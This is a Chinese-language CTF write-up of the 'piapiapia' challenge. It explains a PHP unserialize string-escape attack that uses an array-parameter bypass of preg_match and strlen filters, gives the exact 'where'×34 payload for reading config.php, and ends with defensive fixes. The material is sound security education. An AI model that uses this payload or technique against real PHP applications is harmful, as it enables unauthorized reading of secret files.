🎯 题目概览

DASCTF 靶场的 piapiapia 经典题目，考察 PHP 反序列化字符串逃逸 + 参数类型混淆绕过。题目提供 www.zip 源码泄露，config.php 中 $flag 不可直接访问，需要通过 profile.php 的 file_get_contents() 间接读取。

🛡️ 过滤器分析：正则+长度双重限制

update.php 对 nickname 有两道检查：

检查规则效果
正则/[^a-zA-Z0-9_]/只允许字母数字下划线
长度strlen > 10最多10个字符

这意味着正常 nickname 最多放 2 个 where（10字节），逃逸量仅 +2 字节——远远不够构造完整的注入 payload。

💥 核心突破：nickname[]数组绕过

这是整道题的胜负手。PHP 中 POST 参数 nickname[] 会变成数组！

// 正常参数
nickname = "hello"
$_POST['nickname'] = "hello"  (string)

// 数组参数
nickname[] = "hello"
$_POST['nickname'] = ["hello"]  (array)

数组对过滤器的影响

函数传入数组行为是否die()
preg_match('/[^a-zA-Z0-9_]/', $array)返回 null（不是0也不是1）❌ 不die！
strlen($array)返回 5（"Array"的长度）5 ≤ 10，不die！
// 攻击者视角
nickname[] = "wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}

// preg_match 检测数组 → null → 不触发 die
// strlen 检测数组 → 5 ("Array") → 不触发 die
// 长度限制被完全绕过！🔓

🧮 字符串逃逸：34个where的精确计算

这是数学题。需要精确计算 where 的数量使得逃逸后的字节对齐恰好让 unserialize 正确解析。

计算过程

suffix = '";}s:5:"photo";s:10:"config.php";}'
suffix_len = 34  // 需要逃逸34字节

每个 where(5字节) → hacker(6字节)，逃逸 +1 字节
所以需要 34 个 where → 逃逸 34 字节

payload = where × 34 + suffix
原始长度 = 170 + 34 = 204

filter 后：
  34个where → 34个hacker = 204 字节
  suffix 的 34 字节被「推出」了字符串边界

unserialize 解析：
  s:204:" → 声明读取 204 字节
  读取 = 34个hacker = 204 字节 ✓
  下一个字节 = " (来自suffix) → 字符串闭合 ✓
  剩余 = ;}s:5:"photo";s:10:"config.php";} → 注入新字段！

可视化对齐

│ ...s:204:"[wherewhere...where ×34][";}s:5:"photo"...] │
│        ↑                                               │

📚 教训与防御思路

攻击方教训

  1. 输入校验必须考虑类型混淆：param[] 在 PHP 中让 $_POST['param'] 变成数组，preg_match/strlen 对数组行为完全不同
  2. 不要轻易否定一种攻击方式：第一次失败是因为 where 数量不够，不是原理不通
  3. 精确计算比猜测重要：34 个 where 不是随便选的，是 suffix长度=34 决定的

防御思路

// ✅ 正确做法：先检查类型，再检查内容
if (!is_string($nickname)) die('Invalid input!');
if (preg_match('/[^a-zA-Z0-9_]/', $nickname)) die('Hacker!');
if (strlen($nickname) > 10) die('Too long!');

// ✅ 更好的做法：白名单校验 + 使用 json 代替 serialize
// ✅ 最佳做法：不要用 serialize/unserialize 处理用户可控数据

攻击模式迁移

这种「参数类型混淆绕过校验」的模式在 Web 安全中普遍存在：

  • PHP: param[] 变数组 → is_numeric/strlen 行为变化
  • Node.js: qs 库的 a[]=1 → 原型污染入口
  • Python Flask: key=1&key=2 → request.args.getlist('key')
  • Java Spring: 同名参数 → 数组绑定绕过

当看到任何「先校验输入格式再序列化」的代码时，第一反应应该是：校验和序列化之间有没有类型转换的缝隙？ 🐱
